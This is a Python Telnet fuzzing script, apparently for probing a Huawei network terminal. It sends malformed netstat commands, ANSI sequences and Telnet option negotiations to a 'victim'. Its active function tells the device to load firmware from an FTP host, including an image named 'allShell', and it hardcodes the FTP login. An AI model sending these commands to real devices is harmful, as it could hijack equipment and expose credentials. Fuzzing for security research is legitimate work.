#!/usr/bin/env python3

# This script is for fuzzing purposes.
# Semi-valid commands are crafted and sended to victim, for testing purposes.

# This environment variable is necessary for correct imports, in the pynet directory.
# export PYTHONPATH=$(pwd)

import os
import random
from commands.telnet_combinations import *  # The bash export is needed for this import

su_commands_path    = "/home/grimaldi/Bash/Telnet/commands/su_commands.md"
commands_path       = "/home/grimaldi/Bash/Telnet/commands/commands.md"

# ANSI color escape sequences
ANSI_COLORS = {
    "reset": "\x1b[0m",
    "bold": "\x1b[1m",
    "dim": "\x1b[2m",
    "italic": "\x1b[3m",
    "underline": "\x1b[4m",
    "blink": "\x1b[5m",
    "reverse": "\x1b[7m",
    "hidden": "\x1b[8m",

    # 8-bit color codes
    "black": "\x1b[30m",
    "red": "\x1b[31m",
    "green": "\x1b[32m",
    "yellow": "\x1b[33m",
    "blue": "\x1b[34m",
    "magenta": "\x1b[35m",
    "cyan": "\x1b[36m",
    "white": "\x1b[37m",

    # Background colors
    "bg_black": "\x1b[40m",
    "bg_red": "\x1b[41m",
    "bg_green": "\x1b[42m",
    "bg_yellow": "\x1b[43m",
    "bg_blue": "\x1b[44m",
    "bg_magenta": "\x1b[45m",
    "bg_cyan": "\x1b[46m",
    "bg_white": "\x1b[47m"
}


# Method for getting a list with dump fuzz commands
def fuzz_netstat(number_commands=10):

    # All this variations works correctly
    fuzz_list = [
        auth_request,
        b'su\r\n',
        b'netstat -na\r\n',
        b'netstat -nA\r\n',
        b'netstat -Na\r\n',
        b'netstat -NA\r\n'
    ]
    netstat = b'netstat -n'
    
    for i in range(0, number_commands):
        rand_bytes = os.urandom(1)

        #command = netstat + rand_bytes + b' ? \r\n'
        #command = netstat + rand_bytes + b'\r\n'
        command = netstat + rand_bytes + b'\r\x00'
        #print(command)

        # Increment command list
        fuzz_list.append(command)

    return fuzz_list


# Generate and print commands with random ANSI colors including their aliases and binary sequences.
def fuzz_ansi():
    fuzz_list = []
    # Iterate through ansi colors sequences
    for alias, color_sequence in ANSI_COLORS.items():
        #command = f"{color_sequence}".encode() + b'netstat -na' +  f"{ANSI_COLORS['reset']}".encode() + ENTER
        command = f"{color_sequence}".encode() + b'hello server!' +  f"{ANSI_COLORS['reset']}".encode() + ENTER
        #command = f"{color_sequence}".encode() + b'netstat -na' + ENTER
        #command = f"{color_sequence}".encode() + b'su' + ENTER
        print(command)  # Print command to verify
        fuzz_list.append(command)

    return fuzz_list

# Method for fuzzing ftp 
def fuzz_ftp():
    fuzz_list = [ "r017.bin", "R019_allShell.bin", "r019.bin", "R020.bin", "R020_EPON.bin", "R021_8145V5-V2.bin" ]
    command_list = []

    # Iterate though 'upgrade' files from the ftp server.
    for ftp_file in fuzz_list:
        command = f"load pack by ftp svrip 10.39.125.54 remotefile {ftp_file} user ftpserver pwd 52a7cZdX port 21 \r\n".encode()
        command_list.append(command)

    return command_list


# Method for fuzzing Telnet negotiations for getting terminal ansi enabled
def fuzz_terminal_type():

    fuzz_list = [
        IAC + WILL + TERMINAL_TYPE,                 # Negotiate terminal type
        IAC + DO + TERMINAL_TYPE,                   # Request terminal type
        IAC + WONT + TERMINAL_TYPE,                 # Refuse terminal type negotiation
        IAC + DONT + TERMINAL_TYPE,                 # Reject terminal type request
        IAC + WILL + SUPPRESS_GO_AHEAD,             # Will suppress go-ahead
        IAC + DO + SUPPRESS_GO_AHEAD,               # Request to suppress go-ahead
        IAC + WONT + SUPPRESS_GO_AHEAD,             # Refuse to suppress go-ahead
        IAC + DONT + SUPPRESS_GO_AHEAD,             # Reject suppress go-ahead request
        IAC + WILL + ECHO,                          # Will echo
        IAC + DO + ECHO,                            # Request echo
        IAC + WONT + ECHO,                          # Refuse to echo
        IAC + DONT + ECHO,                          # Reject echo request
        terminal_type_negotiation,                  # Negotiate terminal type as xterm
        terminal_type_negotiation2,                 # Another terminal type negotiation
        IAC + SB + TERMINAL_TYPE + b'\x00' + b'vt100' + IAC + SE,  # VT100 terminal type negotiation
        IAC + SB + TERMINAL_TYPE + b'\x00' + b'ansi' + IAC + SE,   # ANSI terminal type negotiation
        IAC + SB + TERMINAL_TYPE + b'\x00' + b'linux' + IAC + SE,  # Linux terminal type negotiation
        IAC + SB + TERMINAL_TYPE + b'\x00' + b'scoansi' + IAC + SE, # SCO ANSI terminal type negotiation
        IAC + SB + TERMINAL_TYPE + b'\x00' + b'vt220' + IAC + SE,  # VT220 terminal type negotiation
        IAC + SB + TERMINAL_TYPE + b'\x00' + b'sun' + IAC + SE,    # Sun terminal type negotiation
        IAC + SB + TERMINAL_TYPE + b'\x00' + b'unknown' + IAC + SE, # Unknown terminal type negotiation
        IAC + DO + OUTPUT_LINE_WIDTH,              # Request to negotiate output line width
        IAC + WILL + OUTPUT_LINE_WIDTH,            # Will negotiate output line width
        IAC + SB + OUTPUT_LINE_WIDTH + b'\x00\x50' + IAC + SE,  # Set line width to 80 characters
        IAC + DO + TERMINAL_SPEED,                 # Request to negotiate terminal speed
        IAC + SB + TERMINAL_SPEED + b'\x00\x50\x00\x50' + IAC + SE,  # Set terminal speed to 80 baud
        IAC + DO + REMOTE_FLOW_CONTROL,            # Request to negotiate remote flow control
        IAC + WILL + REMOTE_FLOW_CONTROL,          # Will negotiate remote flow control
        IAC + WONT + REMOTE_FLOW_CONTROL,          # Refuse to negotiate remote flow control
        IAC + DONT + REMOTE_FLOW_CONTROL,          # Reject remote flow control negotiation
        IAC + DO + X_DISPLAY_LOCATION,             # Request to negotiate X display location
        IAC + WILL + X_DISPLAY_LOCATION,           # Will negotiate X display location
        IAC + SB + X_DISPLAY_LOCATION + b'localhost:0.0' + IAC + SE,  # Set X display location
        IAC + DO + ENVIRONMENT_OPTION,             # Request to negotiate environment option
        IAC + WILL + ENVIRONMENT_OPTION,           # Will negotiate environment option
        IAC + SB + ENVIRONMENT_OPTION + b'\x00' + b'USER=root' + IAC + SE,  # Set environment variable USER
        IAC + DO + CHARSET,                        # Request to negotiate charset
        IAC + WILL + CHARSET,                      # Will negotiate charset
        IAC + SB + CHARSET + b'\x00' + b'UTF-8' + IAC + SE,  # Set charset to UTF-8
        IAC + DO + AUTHENTICATION_OPTION,          # Request to negotiate authentication option
        IAC + WILL + AUTHENTICATION_OPTION,        # Will negotiate authentication option
        IAC + SB + AUTHENTICATION_OPTION + b'\x00' + b'KERBEROS_V4' + IAC + SE,  # Set authentication to Kerberos V4
        ansi_red,                                  # Send ANSI escape sequence for red text
        IAC + BRK,                                 # Send break signal
        IAC + IP,                                  # Send interrupt process signal
        IAC + AYT,                                 # Send "Are You There" signal
        IAC + AO,                                  # Send abort output signal
        IAC + EC,                                  # Send erase character signal
        IAC + EL,                                  # Send erase line signal
        IAC + DM,                                  # Send data mark
        IAC + NOP,                                 # Send no operation
        IAC + GA,                                  # Send go-ahead signal
        huawei_init_command,                       # Huawei-specific initialization command
        auth_request,                              # Authentication request
        auth_request2,                             # Another authentication request
        echo_message,                              # Echo negotiation
        unknown_command                            # Unknown command for testing
    ]

    return fuzz_list


if __name__ == "__main__":
    
    #commands = fuzz_netstat(100)

    #fuzz_list = fuzz_ansi()
    fuzz_list = fuzz_ftp()
